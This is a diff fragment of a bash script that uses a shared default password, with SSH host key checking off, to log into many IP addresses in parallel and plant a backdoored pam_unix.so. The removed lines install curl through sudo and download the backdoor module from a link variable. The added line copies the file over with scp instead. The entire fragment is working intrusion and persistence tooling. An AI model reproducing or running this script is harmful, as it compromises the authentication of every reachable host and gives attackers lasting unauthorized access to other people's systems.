@@ -24,13 +24,7 @@ main() {
 
     printf "%s\n" "${IPs[@]}" | xargs -P 20 -n1 -I {} bash -c '
         IP="{}"
-        sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$username@$IP" "
-            echo \"$default_password\" | sudo -S apt install -y curl || \
-            echo \"$default_password\" | sudo -S yum install -y curl || \
-            echo \"$default_password\" | sudo -S zypper install -y curl || \
-            echo \"$default_password\" | sudo -S pacman -Syu curl --noconfirm
-            echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\"
-        " || true
+        sshpass -p "$default_password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$backdoor_link" "$username@$IP:$path_to_pam/pam_unix.so" || true
     '
 }
 
